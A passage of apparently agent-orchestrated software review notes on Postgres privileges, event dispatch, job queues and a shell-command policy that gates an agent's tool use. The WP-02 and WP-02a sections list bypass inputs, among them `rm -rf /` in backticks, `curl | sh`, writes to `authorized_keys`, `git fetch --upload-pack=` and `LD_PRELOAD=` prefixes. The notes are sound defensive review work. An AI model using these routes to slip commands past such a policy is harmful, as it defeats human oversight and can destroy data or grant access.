technical/12's user-keyed maps or an opaque provider payload.

**Docs amended by the orchestrator to match the implementation** (the code was right, the docs were
loose): technical/02 line 62 — `actor` lives in the event envelope, not in each payload (matches
`events.actor` in technical/03); technical/12 — `features.shadow_mode` added to the `features:` block.

**Event field renames to remember** (WP-01 chose these over the catalogue's one-line prose):
`ticket.matched.type` → `issue_type`; `task.stage.returned.from`/`to` → `from_stage`/`to_stage`;
`shadow.report.created.comparison` → `artifact`.

**Deferred to later WPs** (reviewer non-blocking, recorded so they are not lost):
- `schemas.ts` mutates `z.globalRegistry` at import and the barrel re-exports it, so every consumer
  inherits ~60 reserved ids; zod 4.5.4's `registry.add` silently overwrites on a duplicate id, and
  `packages/contracts/package.json` declares no `sideEffects`, so the SPA bundles it. Revisit at
  **WP-06** when OpenAPI component naming lands: prefer an exported `registerSchemaIds()`.
- API DTOs are partial — none yet for org stats/audit, project stats, bindings, discovery, kb
  bootstrap/health, task events, shadow reports, or `Idempotency-Key`. The WPs that own those endpoints
  add them.
- `.agentic/pipeline.yml` gate stages accept neither `on` nor `command` — matches the doc's
  `rebase_gate` example but is under-constrained; tighten at **WP-15** (pipeline interpreter).
- `TranscriptEvent` keeps `tool_use_id`/`tool_name` inside content blocks while technical/03 indexes
  them as columns — mapping work for **WP-07**.

Q35 filed in `docs/OPEN-QUESTIONS.md` (technical/12 omits `DiscoveryDraft`'s `data`); recommendation
grounded in product/06 step 2 and implemented.

**Round 2 (hardening, APPROVE).** Five reviewer non-blockers folded in before commit: the `$defs`
collision guard now keys on the canonical definition (the old guard could never fire, so two different
anon defs could merge silently) and moved to an internal `json-schema-defs.ts`; the type-stripping
resolver is scoped to the repo root and outside `node_modules`; the boundary lint denies unknown
packages by default and closes the relative-escape holes; `verify` emits exactly one stdout line per
target (child stdout → fd 2), restoring the protocol's contract; coverage reached 100/100/100/100 over
285 tests. The implementer also found and fixed a real dangling-`$ref` bug that produced
`#/$defs/#/$defs/__schemaN`. `schemas/` regenerates byte-identically.

Residual, all verified unreachable today — fix if the area is touched again:
- an `anon_<hash>` name colliding with a real named `$defs` entry silently clobbers it (one
  `if (!ANONYMOUS_DEF.test(name) && defs[name])` restores the old guard's coverage);
- `stabiliseDefs` rewrites `#/$defs/__schemaN` anywhere in the serialised document, including inside
  `description`/`const`/`enum` strings;
- the Biome `@platform/*` group misses **subpath** specifiers (`@platform/application/src/x.js` passes
  lint; only the `.`-only `exports` maps stop it) and relative escapes to a package root outside `src/`
  (`../../contracts/index.js`);
- any future `verify` step whose stdout must be *captured* will silently land on stderr.

### WP-02 / WP-03 — review round 1 findings (both REQUEST_CHANGES, 2026-09-09)

Both reviewers reproduced their findings by exploit rather than by reading, which is the standard to hold.

**WP-03 (Postgres) — two proven privilege escalations.** (a) Both SECURITY DEFINER functions were created
with PostgreSQL's default `EXECUTE TO PUBLIC`; the `REVOKE ... FROM PUBLIC` lived only inside
`platform_apply_grants`, which never runs when `APP_DB_APP_ROLE=''` — the pgbouncer configuration
`.env.example` itself documents. A role holding only `CONNECT` dropped a `run_messages` partition.
(b) `event_streams` was not registered in `platform_table_policy`, so `platform_app` held UPDATE/DELETE on
the table that substitutes for technical/03's `UNIQUE(stream_type,stream_id,stream_seq)` — deleting a row
and re-inserting produced two events at seq 1, i.e. WP-04 would have inherited a forgeable invariant.
Also fixed this round: partition bounds cast in the caller's TimeZone (a non-UTC session aborts
`platform_ensure_partitions` with "partition would overlap"); `platform_drop_expired_partitions` taking an
unfloored retention window from the caller as a designed bypass of `REVOKE DELETE`; a missing concurrency
test for the seq guard; and `migrator.ts` (240 lines, including the branch that opened finding (a))
excluded from coverage.

**WP-02 (domain) — three command-policy bypasses**, all returning `allow`: `&` missing from the list
operators (`ls & sudo reboot`); backticks not treated as substitution (``ls `rm -rf /` ``); and
prefix-anchored block globs that a moved flag escapes (`git push origin agentic/x --force`), which also
left product/19 §3's "writing outside the workspace" with no pattern at all
(`cat /etc/passwd > /root/.ssh/authorized_keys`). Separately, `resolvedBinary` never blocked anything
because block patterns are command-line globs, so BD-025's "resolved against the real binary" was unmet —
and the test that covered it passed a whole command line as the binary. The block-list property test also
filtered out exactly the metacharacters that break segmentation.

**Docs amended by the orchestrator** (code was right, or the doc had a real gap): technical/02 gains
`run.created` (the `created→starting` transition was silent, contradicting the document's own rule that
every state change is an event); technical/03 gains the `feedback` table (technical/02 and
`contracts/records.ts` both define the aggregate, the data model had no table), a corrected
`runs_active_idx` status list (`queued` is not in the `run_status` enum), and a note that `stage` on
`RunRecord`/`QuestionRecord` must be **nullable** because not every run or question belongs to a pipeline
stage (`task_stage_id` is nullable) — WP-01 typed it non-nullable; WP-04 corrects the contract.

**Scheduled follow-ups (not done in these WPs):** `pipelineLimitsSchema` lacks two of BD-008's six loops
(`refinement_question_rounds`, `architecture_revisions`) — enforced in domain, not configurable; WIP limits
have no schema anywhere. Both belong in `packages/contracts` + technical/12.

**WP-04 must honour (confirmed by exploit at WP-03 round 2):** the `events_enforce_stream_seq()` trigger
is SECURITY DEFINER and its `on conflict do update … returning` takes the `event_streams` row lock itself,
so per-stream appends serialise without the caller doing anything. WP-04 must **not** issue
`SELECT … FOR UPDATE` on `event_streams` — the app role holds SELECT only, and row locks need UPDATE, so
every lock mode returns 42501. A pessimistic aggregate load locks the aggregate's own read_write row
(e.g. `tasks`). The exposed contract is: insert with `stream_seq = last + 1`; a mismatch raises 23505 and
rolls the counter back with the transaction. Also: no past-month partitions are ever created, so WP-04
must not accept caller-supplied past `occurred_at`.

### WP-02 — command policy: three review rounds on one file

`packages/domain/src/policies/command-policy.ts` took three review rounds; everything else in WP-02 was
approved in round 1. Round 1 found three bypasses (`&` missing from list operators, backticks not scanned,
prefix-anchored block globs a moved flag escapes). Round 2's 101 adversarial probes found three more
(process substitution `<(…)`, ANSI-C quoting `$'…'` desyncing the quote state, and a *regression* — the
new token matcher had silently lost the whole-line glob coverage the old scheme had, so `curl * | sh`
stopped matching).

**The lesson, recorded because it generalises:** a hand-rolled shell scanner will never be complete, so
round 3's instruction was to make parse uncertainty **fail closed** rather than to patch three more cases.
`CommandEvaluation.uncertainty` now names what the scanner could not follow, and a non-empty uncertainty
can never evaluate to `allow` — it floors to the fallback and never loosens a `block`. Exactly five
constructs floor to ask: unclosed quote, unterminated command/process substitution, unterminated backtick,
ANSI-C quoting, arithmetic expansion. Nesting is deliberately *not* one of them, because substitution
bodies and wrapped scripts are parsed recursively to the bottom.

Also landed: argv[0] normalisation (basename, leading `VAR=value`, and the wrapper set
`env/command/exec/nohup/time/nice/ionice/xargs/builtin/sh/bash/zsh/dash/eval`), which closed a whole class
of `FOO=1 sudo reboot` / `xargs sudo id` / `/usr/bin/sudo reboot` misses at once; and `DECLINED_BLOCK_VARIANTS`
naming `rm -fr /`, `rm -r -f /`, `git branch --delete --force main` as deliberately unpatterned, with **Q37**
recommending product/19 §3 state the hazard rather than one spelling.

**Orchestrator correction:** I told the implementer to move all of `git rebase*` to ask; that was too broad
and they pushed back correctly. Only `git rebase* -x*` / `--exec*` are hazardous, and WP-26's rebase gate
runs `git rebase` on its happy path — blanket-asking would cost a human approval on every task. Narrowed to
match how `find * -exec*` was already handled.

**Severity frame for anyone reading this later:** this is a *policy* layer. WP-12's `canUseTool` hook and
TD-021's container isolation are the enforcement points. A command that wrongly reads `ask` is a nuisance;
one that wrongly reads `allow` is the defect.

### WP-02a — command policy, two `allow` routes (carried out of WP-02)

**Why this is a separate WP.** WP-02's three review rounds were spent, and the protocol bounds review loops
at three. But round 3 found two *newly discovered* defects rather than repeated failures to fix the same
thing, and blocking WP-02 would have stalled WP-04 and WP-15 — most of M1 — over one file. So WP-02 is
committed and the two defects are tracked here with a fresh review budget.

**Why committing them is safe today, and when it stops being safe.** This is a *policy* layer. The
enforcement points are WP-12's `canUseTool` hook and TD-021's container isolation, neither of which exists
yet: nothing in the repo can execute a shell command at all. The exploits require the runner and workspace
that WP-12/WP-14 build. **WP-02a must therefore land before WP-12**, and certainly before WP-15 wires the
pipeline. It is not optional cleanup.

**Defect 1 — command-runner flags on allow-listed verbs.** `git fetch --upload-pack='<any command>' .`
executes the payload; verified against real git 2.50.1 in a throwaway repo. Every block-list entry runs
under `allow` this way: sudo, docker, kubectl, `rm -rf /`, `terraform apply`, `npm publish`, `curl | sh`.
`rg --pre` and `rg --hostname-bin` are the same class, as are `git fetch --exec`. This is exactly the hazard
that already moved `find * -exec*` and `git rebase* -x*` to ask — the pattern set simply missed these verbs.
Fix: add ask entries at `DEFAULT_IMPLEMENTATION_ASK`.

**Defect 2 — assignment peeling grants `allow` to an unread line.** `stripEnvironmentPrefix` peels leading
`VAR=value` before the allow/ask lists match, so `PATH=/w/bin ls -la` evaluates as plain `ls` and returns
allow — verified executing a fake `ls`. `LD_PRELOAD=…`, `GIT_SSH_COMMAND=… git fetch`,
`GIT_EXTERNAL_DIFF=… git diff` and `GIT_PAGER=… git log` are the same route, and it defeats BD-025's
"resolved against the real binary" in the process. This is the precise reasoning the implementer used for
*not* peeling `sh -c`/`eval`/`xargs` — it was applied to the wrapper half of the peel but not the
assignment half. Fix: keep the peel for the block list only (where it can only tighten), or floor any
assignment-bearing line at ask.

**Also in scope for WP-02a (non-blocking at WP-02):**
- `close + 2` off-by-one at `command-policy.ts:554-555` swallows the character after `$((…))`, so
  `ls $((1))&sudo id` never splits on `&` — ask instead of block. A real desync the uncertainty floor
  cannot catch, because it is not a parse *failure*.
- `git push -f`, `git push origin agentic/x --delete` and refspec form `agentic/foo:main` are not blocked
  though `--force`, `--force-with-lease` and `origin :*` are — spelling gaps, not logic gaps.
- `curl|sh` whitespace sensitivity: `curl http://x|sh`, `| bash`, `| /bin/sh`, `|&` and `wget -O- http://x|sh`
  all reach ask rather than block.
- `git commit --no-verify` is allowed and bypasses this repo's own gitleaks/lefthook pre-commit.
- `evaluateCommand(…, fallback:'allow')` would disarm the uncertainty floor entirely; no caller does that
  today, but nothing prevents one.
- **Q37 must be widened** and its "never allow" claim dropped — it is now demonstrably false.

**What the final review did confirm:** process substitution, ANSI-C quoting, the restored whole-line glob,
the wrapper asymmetry (`env ls` allow, `env nice sudo id` block), the six `git rebase` verdicts, and the
uncertainty floor itself — no path reaches `allow` with non-empty uncertainty. 188 hand-written adversarial
inputs plus 23,760 fuzzed combinations found **no segmentation hole**: every fuzzed `allow` was correct
shell semantics. No ReDoS (50KB input → 8ms). The defects above are missing *patterns* and one peel that
grants trust, not a broken parser.

### WP-05 — the `debounce` that was not a debounce

The review found that the `Jobs` port's `debounce` mode runs its leading job **immediately** (`startAfter`
is now) and its trailing job at the next grid boundary, which can be milliseconds later. technical/02:106
requires the pipeline to debounce `mr.review.comment` for 2 minutes per MR **and then emit one**
`task.stage.returned`; as first shipped, a burst would emit up to two stage-returns with the first instant —
the task would bounce back to Implementation before the human finished commenting. **WP-15's MR batcher must
not use a fixed-grid coalescing primitive for this.** The pattern it needs is a delayed wake-up plus
re-validation on wake: schedule a timer 2 minutes out, and when it fires, re-read whether more comments have
arrived and reschedule if so. TD-004's own "timers re-validate" line is the same idea.

Second finding worth generalising: **the in-memory fake was kinder than pg-boss.** It bucketed the
coalescing slot by `startAfter`, while pg-boss buckets by the database's `now()` (`plans.js:1748`) and
overwrites the caller's `startAfter` with the next slot boundary on a debounce retry. The reviewer found
this by reading pg-boss's source, not the docs. A shared contract suite only protects later WPs if the fake
is *at least as strict* as the real adapter — every WP from here trusts the fake in the unit tier.

**Flake economics, quantified.** The coalescing acceptance test races a 2-second grid boundary across three
awaited round-trips: ~0.2% failure locally, **5-30% on a loaded 2-core runner**. Combined with the WP-02
property-test timeout, the rule for this repo is now explicit: *an assertion that depends on wall-clock
speed is a hardware assertion, not a correctness one.* Use the virtual clock in the contract tier, keep
real-time assertions to "never early", and give anything that must sleep real headroom.

**For WP-06:** `registerPartitionMaintenance` is exported and integration-proven but no `apps/*` composition
root calls it — the daily partition cron WP-03 built will not run until WP-06 wires it. Also note
`defineQueue` is create-if-absent, so changing a queue's policy in code is a silent no-op against a queue
that already exists; a boot-time drift check would catch it.

### WP-02a — what a hand-rolled command policy actually costs

Recorded because the pattern repeated four times and the next person will be tempted to write one of these.

Across WP-02 rounds 1-3 and WP-02a rounds 1-2, six independent adversarial passes found **fifteen** routes
to `allow` in one file. Each pass found defects the previous pass's fixes had not anticipated, and two
passes found that a *fix itself* had silently removed coverage (`curl * | sh` after the token-matcher
rewrite) or reopened an earlier fix (quote-stripping reopened `find . "-exec"`). The parser was never the
problem — 60,000+ fuzzed inputs found no segmentation hole and no ReDoS. The problems were always
**pattern coverage** and **unearned trust**:

- flags that hand an allow-listed verb an arbitrary command (`git fetch --upload-pack=`,
  `git difftool --extcmd=`, `rg --pre`, `git log --ext-diff`), an arbitrary binary, an arbitrary output
  path (`git diff --output=`, GNU `find -fprint`), or an unread remote source (`pip --index-url`);
- prefix globs matching a *different binary* (`ls*` → `lsof`, `git diff*` → `git difftool`,
  `git fetch*` → `git fetch-pack`);
- peeling something off the front of a line and then trusting what remains (`PATH=… ls`);
- quoting and escaping defeating a matcher that never strips quotes.

**The two things that actually worked**, and that any successor to this code should keep: the fail-closed
uncertainty rule (a line the scanner cannot follow can never read `allow`), and *differential* testing —
running the old and new revision side by side over a large corpus and asserting that no verdict loosened.
That second technique caught a regression no amount of new test cases would have: the implementer's own
fuzz found that their `|&` fix had made `|& docker run alpine` a one-stage pipeline which a `length > 1`
guard then dropped, loosening 185 verdicts.

**But differential testing is only as good as the axes you vary, and this is the sharper lesson.** The
implementer reported "0 loosened" across 4,921 hand-built inputs and 240,000 fuzzed ones. The reviewer's
own 179,712-input sweep found **3,624 loosenings** — a family the implementer's generator could not reach
because its quoting axis never varied the *wrapper token*: `"env" ls -la` and `e\nv ls` now peel for the
allow-list because `stripEnvironmentPrefix` tests the dequoted `argv0Name`. Every one of the 3,624 returns
exactly its unquoted twin's verdict, which was already `allow`, so it is an equivalence family and not a
hole. The finding that matters is procedural: **a differential result is evidence about the corpus, not
about the program**, and the person who built the corpus is the worst judge of what it omits. Two
independent corpora disagreed by 3,624 cases here.

**Two corrections that outlived the round** (both from the round-2 reviewer, both recorded in the module doc):

- The `git commit -m "add --output-file"` over-ask is **not** the shell's doing, as the code comment claimed.
  Bash hands git one word, `add --output-file`, and git never sees a flag. It is `tokenise` splitting on
  whitespace with no quote awareness, after which `unquoteToken` strips the orphan quote and what remains
  classifies as a flag. **The right fix is to make `tokenise` quote-aware** — confirmed to remove the false
  positive without weakening any bypass case. Deliberately not done in WP-02a: it is a behaviour change on
  the security path, and the measured false-positive rate is 0.006% (3 of 54,177 real commit subjects).
  **Do it in the next WP that touches this file.**
- Recorded, no action: `git show-ref`, `git diff-tree`, `git diff-index --quiet HEAD` and `git diff-files`
  moved allow→ask as a side effect of scoping the git verbs — read-only and harmless; add explicit allow
  entries if agents start hitting them. `MAX_WRAPPER_DEPTH = 8` means nine or more stacked `nice -n 5`
  wrappers escape token block-matching and land on `ask` rather than `allow` — pre-existing and fail-safe.
- Property-test timeouts now cover `packages/contracts` too (6 `fc.assert` calls that had none — the same
  5s CI flake surface the ci-fix was written for, in the package the ci-fix had not audited). `contracts` is
  the innermost ring and the dependency rule gives it no workspace import, so its `testing/property.ts` is a
  deliberate copy, not an import.

**Empirical note on over-asking:** measured against 54,177 real commit subjects, the aggressive hazard floor
made only 3 of them non-allow (0.006%). Over-asking is cheap; the instinct to soften a security floor for
false positives was not supported by the data.

### WP-04 — implementation notes for whoever touches the dispatcher next

**One transaction per (event, handler), not per event.** TD-005 records `attempts` and `error` per
*handler*, which only means something if a failing handler can be retried without re-running the ones that
succeeded. Each handler's effect, its `handler_executions` row and anything it emitted commit together or
not at all — that is what turns at-least-once delivery into exactly-once effects. The dispatcher's own
transaction holds the queue row for the length of the dispatch and either deletes it or defers it.

**Migration 0010 exists for two reasons.** `events.id`/`cause_event_id`: technical/02 requires both and WP-01
implemented them, so without the columns a stored event could not be parsed against its own catalogue
schema. `event_dispatch`: an AFTER INSERT trigger on `events` keeps the enqueue inside the appending
transaction — nothing can append without queueing — and makes the sweep O(pending). Anti-joining `events`
against `handler_executions` on every poll would re-read the whole audit log, and no watermark over
`events.position` is safe, because positions are handed out at insert time and commit out of order
(research/07). The queue holds no audit value; what ran stays in `handler_executions`.

**Ordering per stream is enforced twice**: the sweep's `row_number()` returns only the earliest queued event
of each stream, and `hasEarlierPending` re-checks under the claim, so an event handed to `dispatch()` out of
order is refused rather than run. **`stop()` is durable**: the stopping handler writes `stopped` rows for the
remaining handlers in its own transaction with `on conflict do update` (not `do nothing`) — on a redelivery
the policy handler is skipped as already succeeded, so only those rows keep the silenced handlers from
running, and a row left `failed` by an earlier attempt must be overwritten.

**The property tests are only as adversarial as their knobs.** They generate crash schedules on both sides of
each commit, interleaved workers, a `chaoticWorkers` knob that hands the dispatcher events out of order, and
a `selfGuarding` flag that turns the handlers' own idempotency off so `handler_executions` is the only thing
left. Each guard was mutation-checked — disabling the ordering check, the handler claim or `markStopped`
each makes a property fail. Anything added here should be mutation-checked the same way.

### WP-04 / WP-05 reconciliation — one queue of record, decided

Both WPs arrived with a loop. The decision, taken on the WP-04 reviewer's analysis and implemented in both:

**`event_dispatch` plus the sweep is the single queue of record** — that half was right and stands.

**The other half was wrong, and the architect corrected it (2026-09-09).** I said WP-05's `Jobs` port should
drive the sweep. It cannot: `Jobs` offers only `scheduleCron` with a 1-minute floor, while the sweep needs
~1s, and no adapter was ever written. More importantly it *should* not. **The outbox sweep is a local timer
in each process.** Each replica LISTENs on its own connection, so a missed NOTIFY is a *local* loss — a
cluster-singleton job cannot be the fallback for a subscription it does not share. `OutboxWorker` owns its
timer unconditionally; `DrainScheduler`, `OutboxWorkerOptions.scheduler`, the `withTimer` branch and
`EventingOptions.scheduler` are all deleted (tracked as **WP-04a**). `drain()` stays public for tests and
`ROLE=worker --once`.

**N replicas polling one `event_dispatch` every second is correct, not wasteful.** The claim uses
`FOR UPDATE SKIP LOCKED`, so concurrent sweeps never block; a loser reads fewer rows or reports `deferred`,
and per-stream order is still enforced twice (the `row_number()` head plus `hasEarlierPending`). It is below
pg-boss's own per-replica polling (2s default per `work()` subscription), and `drain()` exits when a batch
dispatches nothing, so a replica losing every claim does not spin. The pg-boss route would have been
*worse*: a 1-minute cron floor plus cron-monitor lag (≤45s) plus a 2s worker poll is a far poorer fallback
than the 1s poll TD-014 names, and it writes a durable job row per sweep for durability `event_dispatch`
already owns.

Two costs recorded, not fixed: `readPendingDispatch` windows over the whole queue table, so a deep backlog
costs O(pending) per replica per second; and N fixed 1s timers synchronise, so ±10% jitter is cheap
insurance. Neither matters at current scale.

**Why not make `dispatch(event)` a pg-boss job**, which was the tempting alternative: it duplicates
durability across two queues that disagree after a crash, and pg-boss has no per-stream serialisation — so
ordering would collapse onto `hasEarlierPending` refusing and rescheduling, i.e. a retry storm instead of
deliberate head-of-line blocking.

### WP-04 — the constraint nobody had named

The dispatcher opened a **nested** transaction per handler while the outer dispatch transaction was open,
each taking its own `pool.connect()`. With no `connectionTimeoutMillis`, exhaustion was not an error but a
**permanent silent hang**: N concurrent dispatches with `poolMax <= N` never completed, `APP_DB_POOL_MAX=1`
passed validation and hung on the very first event, and the existing integration test had been hand-tuned to
`max: 8` for 4 dispatchers — exactly 2× — without anyone writing down why.

The fix is worth copying: an implicit constraint became an **enforced invariant**. `EventBus` takes
`maxConcurrentDispatches` (`APP_DISPATCH_MAX_CONCURRENCY`, default 1) with a FIFO slot semaphore;
`requiredConnections = 2 × concurrency + 1`; `createEventing` throws `InsufficientPoolError` naming both
variables and the arithmetic; `APP_DB_CONNECTION_TIMEOUT_MS` (default 10s, floor 100ms) makes exhaustion
fail loudly, leaving the event queued for the sweep. A test pins the failure mode as a prompt error rather
than a hang.

**`MemoryEventing` models no pool** — the one place the fake is kinder than Postgres. A green property run
says nothing about pool sizing. Later WPs must not read it as such.

**Watch at WP-15:** `2 × concurrency + 1` is the right budget only while a handler opens at most one
transaction. A handler that opens a second one silently invalidates it. It is also a **floor for the
dispatcher, not a budget for the process** — the same pool serves `Broadcast.publish`, the API and
whatever WP-05/WP-06 add — so `InsufficientPoolError` and `.env.example` say "above", not "set to".

**Round 2 found the invariant leaking twice, and both are worth remembering.**
- *The semaphore over-admitted.* Releasing a slot decremented the counter and *then* woke a waiter,
  which resumes a microtask later — so for that gap the counter was below the limit and a
  `dispatch()` call already queued took the freed slot while the waiter took one too. Limit 1,
  two handlers. Fix: hand the slot **over** — shift the waiter first and call it without
  decrementing, and drop the increment after the await. There is then no instant at which the slot
  is free. Reproducing it needed the probe to arrive *at* the release rather than before it (a fan
  of dispatches at every microtask depth after each release); the first probe missed it because all
  its callers were already parked in the wait queue.
- *There were still two drain loops.* With a `DrainScheduler` the worker's `#runWoken` still armed
  the poll timer, so the scheduler's recurring drain was a second one — exactly what the
  reconciliation existed to prevent — and the test only passed because its poll interval was longer
  than the assertion window. Fix: `#waitForWork({ withTimer })`, false in the scheduler branch. The
  test now uses a 5 ms interval, so the timer coming back would fail it.

Both are the same lesson: a guarantee that is only *usually* true reads exactly like one that holds,
and a test whose timing hides the difference certifies it. Each guard here is mutation-checked —
revert it and a test must go red.

**The semaphore probe must stay at the unit tier**, and the module comment says so. The reviewer's
equivalent experiment against a real PostgreSQL, pool at exactly the floor, **passes on the broken
semaphore and the fixed one alike**: a COMMIT round-trip pushes the release into a later macrotask
turn, so every caller is already parked and the gap never opens. The in-memory fake, where a commit
resolves on a microtask, is the only instrument that reaches it. Anyone "promoting" that probe to an
integration test deletes the only coverage `requiredConnections` has.

**Two known limits, recorded rather than fixed:** `PostgresBroadcast.close()` does not await an
in-flight `#connect`, so shutdown is deterministic only if the caller awaited `subscribe` first (the
connection cannot leak — that guard is in — but the ordering is not pinned); and a handler that
captures the bus and calls the public `dispatch()` self-deadlocks at concurrency 1, because only
*chained* events inherit their parent's slot. The second belongs in the handler documentation at
WP-06.

### WP-04 — two rounds of "the fix undermined its own invariant"

Both rounds of WP-04 review found the same *shape* of defect: a guarantee stated in a comment, an env file
and an error message, which the code did not actually provide.

**Round 1** was the nested-transaction pool exhaustion (a permanent silent hang; see the note above).
**Round 2** found the fix for it was itself unsound in two ways:

- **The slot semaphore over-admits.** `#releaseSlot` decremented `#active` and *then* woke a waiter that
  incremented it again on a later microtask, so a `dispatch()` already sitting in the microtask queue could
  steal the freed slot. Measured: `maxConcurrentDispatches=1` ran **2 concurrent handlers**. That makes
  `requiredConnections = 2 × concurrency + 1` not an upper bound (C+1 dispatches can need 2C+2) while
  `.env.example` and `InsufficientPoolError` both told the operator to size at exactly 2C+1. Narrow in
  practice — 46 real-Postgres probes never hit it, because the COMMIT round-trip pushes the release into a
  fresh macrotask turn — and self-healing through timeout→requeue, but it falsified the invariant the whole
  fix rested on. The fix is to *hand the slot over* rather than return it to the pool of free slots.
- **There were still two drain loops**, the precise thing the WP-04/WP-05 reconciliation existed to prevent.
  `#runWoken` still armed `setTimeout(pollIntervalMs)` even with a `DrainScheduler` supplied, so the worker
  kept polling *and* the scheduler added a second recurring drain. Proved with a scheduler that never runs
  and no broadcast: the event was dispatched anyway. Both the module comment and the test comment claimed
  the timer had been handed over. The test passed only because `pollIntervalMs` was 1234ms — longer than
  its own assertion window.

**The generalisable lesson, and it is the third time this session:** a comment, an error message or an
`.env.example` line asserting an invariant is not evidence the invariant holds, and a test that would pass
whether or not the behaviour is present is not a test of it. Both defects were found by *constructing the
adversarial interleaving* and by *removing the collaborator* (a scheduler that never runs), not by reading.

**The instrument matters as much as the test (WP-04 round 3).** The reviewer ran the semaphore
over-admission experiment against a *real* Postgres with the pool at exactly the floor, and it passed on the
fixed code **and on the deliberately reverted code alike** — with real I/O every caller is already parked by
the time the release lands, so the race never fires. Only the in-memory microtask probe, fanning dispatches
at depths 0-25, pins the defect. Whoever later finds that probe artificial and "promotes" it to an
integration test will silently delete the only coverage of this bug. The probe's comment now says so.

**Recorded, structural:** the pool guard lives only in `createEventing`, so a hand-built `EventBus` — as in
`broadcast.integration.test.ts` — is unchecked. `Broadcast.publish` also draws from the same pool and sits
outside the `2C+1` accounting; unused by WP-04 today, but WP-05 and WP-06 share that pool, so the required
count is a **floor to add to**, never a target.

### WP-05 — a literal NUL byte turned a source file binary

`packages/infrastructure/src/jobs/in-memory-jobs.ts` contained a literal NUL in a template string
(`` `${queue}\0${key}` ``), so **git classified the file as binary**. The damage was silent and
compounding: the entire fix commit's changes to that file — the core of the fake/pg-boss reconciliation —
rendered in the diff as `Bin 15783 -> 16434 bytes`, so a reviewer could not see them; `grep -rn` skipped
the file; and it could not be 3-way merged, which mattered because three worktrees were merging. Replaced
with the `\0` escape; behaviour verified identical (the key is still a NUL-separated composite, and both
the job-name and job-key patterns exclude NUL so the separator stays unambiguous). A repo-wide scan found
no other NUL bytes. **Worth a lint rule if it ever recurs.**

### WP-05 — the fake-versus-production divergence register

Four divergences between the in-memory `Jobs` fake and pg-boss were found across three rounds, each by
reading pg-boss's *source* rather than its documentation: the coalescing bucket (`startAfter` vs the
database's `now()`), the trailing-job extra second in `getDebounceStartAfter`, the retry state (`created`
vs `retry`, which have different index slots), and `retryBackoff` — forwarded by the adapter and silently
ignored by the fake.

Three of those made the fake **kinder than production**, which is the one direction that matters: every
later WP's unit tier trusts the fake, so a fake that admits what pg-boss would block, or fires earlier than
pg-boss would, launders a bug into the unit suite as a pass. The register now lives in the fake's header
under the rule *"stricter than production, never kinder"*, cross-referenced from the retry and concurrency
sites, and distinguishing entries that are genuinely stricter from those that are merely different.

**The rule for every fake in this repo:** a fake may be stricter than the real adapter, never kinder, and
each deliberate difference is written down where the fake is defined. `MemoryEventing` (WP-04) models no
connection pool, which is why a green property run there says nothing about pool sizing.

### Merging two parallel WPs — the real cost, measured

WP-04 and WP-05 ran concurrently in isolated worktrees and neither could see the other. Merging the second
one produced conflicts in six files and one genuine break that no amount of in-worktree verification could
have caught:

- **Mechanical conflicts, resolved as unions:** `packages/{application,infrastructure}/src/index.ts`
  (both added exports), both `package.json` dependency blocks, `.env.example` (both added variable blocks),
  and `pnpm-lock.yaml` (regenerated with `pnpm install`).
- **A semantic break typecheck only found after the merge:** WP-04 added a *required* `connectionTimeoutMs`
  to the database config type — the field that turns pool exhaustion from a silent permanent hang into an
  error — and WP-05's pg-boss integration test builds that config literal without it. Both worktrees were
  green in isolation; the combined tree was not.
- **`docs/OPEN-QUESTIONS.md` numbering collided** exactly as predicted, since WP-05 branched before WP-02
  landed Q36/Q37. Renumbered its calendar question to **Q38** at merge.

**The rule this earns:** worktree parallelism is worth it for genuinely disjoint packages, but *green in a
worktree is not green on `main`*, and the merge must re-run all four verify targets before the commit is
written — not after. Watch particularly for a WP that adds a **required** field to a shared type or a new
runtime invariant (WP-04's `2 × concurrency + 1` pool floor throws at *runtime*, so a stale hand-built
config in another WP's test would not even fail typecheck).

### WP-04a — delete the `DrainScheduler` seam (queued, before WP-06)

Small cleanup, but it must land before WP-06 wires the composition root, because the dead seam actively
misleads: `JOB_QUEUES.dispatch = 'dispatch'` invites WP-15 to enqueue events onto a pg-boss queue that must
not exist. Scope: delete `DrainScheduler`, `OutboxWorkerOptions.scheduler`, `#runWoken`/`#scheduled`, the
`withTimer` branch, `EventingOptions.scheduler` and `JOB_QUEUES.dispatch`; `OutboxWorker` owns its timer
unconditionally; the canonical sweep name is `events.outbox.sweep`, one constant in `outbox.ts`, documented
as a log/metric label rather than a queue name.

**TD-004 amended** (docs win over code, so the record was corrected first): `dispatch(event)` is no longer a
pg-boss workload; there is **no transactional enqueue** (the adapter binds one pool, so `enqueue` cannot join
a handler's transaction — enqueue after commit and re-validate on fire); and `mr.comment.debounce` must use
`stately` + `singletonKey` + `startAfter`, never `coalesce`.

**WP-04a outcome.** Deleted cleanly; the reviewer confirmed `EventingOptions.scheduler` had no production
caller, so no live behaviour was removed. `OutboxWorker` now arms its timer unconditionally on every pass,
and `OUTBOX_SWEEP_JOB` became `OUTBOX_SWEEP_LABEL` — a log and metric field, not a queue name.

The interesting part is the testing. The deleted scheduler tests **could not** have caught a conditionally
armed timer, which is precisely how WP-04's round-2 defect survived its own test suite. The replacements
can, and three independent mutations prove it: removing the `setTimeout` fails 4 tests; arming it only when
there is no broadcast (the exact original defect) fails "polls even while subscribed"; and arming it only on
the first pass fails "re-arms its own timer" with `expected 2 to be greater than or equal to 3` — so the ≥3
threshold is load-bearing rather than arbitrary. **A replacement test is only an improvement if a mutation
shows it detects what the old one missed.**

**4. The same defect, one layer down.** WP-06's first SSE fix exempted replay from being *rejected* by the
slow-consumer cap — but replay frames still incremented the counter the live check reads. So a large replay
poisoned the budget for live frames: three near-full topics plus one live publish arriving mid-drain
delivered **1 of 765 frames** and closed the connection with no `reset`. Reachable at shipped defaults,
because the SSE transport waits for a socket `drain` — a macrotask — exactly when a replay is large. The fix
that works is a separate counter for live frames only.

Worth generalising: when a fix carves out an exception ("replay is exempt from the cap"), check every place
the *underlying quantity* is still shared. The exemption was correct at the rejection site and useless
because the accounting was not exempted with it.

**5. A guard with a hand-maintained scope drifts.** The new `ignored:check` guard listed source roots by
hand, so it did not cover the repository's own root files or `.claude/` — 21 tracked files, including
`vitest.config.ts`, were unguarded, and adding `*.config.ts` to `.gitignore` still passed. A guard against
"files git cannot see" should ask git what it tracks, not carry its own list of where to look.

**WP-06a outcome — the instrument was the bug.** Asked to fix the harness before the code, the implementer
reported the finding that justifies the whole detour: with a realistic transport (two macrotasks per write,
`'drain'` semantics) and the old `settle`, the *currently passing* 766-frame completeness test delivered
**2 of 766 frames**, while `expect(closed).toBe(false)` two lines above passed on that same 2-frame stream.
**No existing assertion could reach the defect.** Three review rounds had each been validated by
